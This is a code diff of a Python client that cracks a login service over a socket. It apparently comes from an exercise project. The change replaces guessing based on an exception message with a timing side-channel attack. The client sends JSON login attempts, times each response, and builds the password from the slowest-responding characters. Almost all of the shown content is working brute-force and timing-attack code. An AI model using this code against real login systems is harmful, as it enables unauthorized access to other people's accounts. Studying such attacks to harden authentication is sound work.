@@ -2,10 +2,10 @@ import socket
 import argparse
 import string
 import json
+from datetime import datetime
 
 WRONG_LOGIN = "Wrong login!"
 WRONG_PW = "Wrong password!"
-EXCEPTION = "Exception happened during login"
 SUCCESS = "Connection success!"
 PW_CHARS = string.ascii_letters + string.digits
 
@@ -26,21 +26,26 @@ def crack_login(client, login_file):
 
 def try_pass(client, login, attempt):
     data = {'login': login, 'password': attempt}
-    client.send(json.dumps(data).encode())
-    resp = json.loads(client.recv(256).decode())
-    return resp['result']
+    encoded_data = json.dumps(data).encode()
+    start = datetime.now()
+    client.send(encoded_data)
+    resp_data = client.recv(256)
+    end = datetime.now()
+    resp = json.loads(resp_data.decode())
+    return resp['result'], end - start
 
 
 def crack_pass(client, login):
     sub_pass = ''
     while True:
+        char_times = {}
         for char in PW_CHARS:
             attempt = sub_pass + char
-            result = try_pass(client, login, attempt)
-            if result == EXCEPTION:
-                sub_pass = attempt
-            elif result == SUCCESS:
+            result, duration = try_pass(client, login, attempt)
+            if result == SUCCESS:
                 return attempt
+            char_times[char] = duration
+        sub_pass += max(char_times, key=char_times.get)
 
 
 def main():
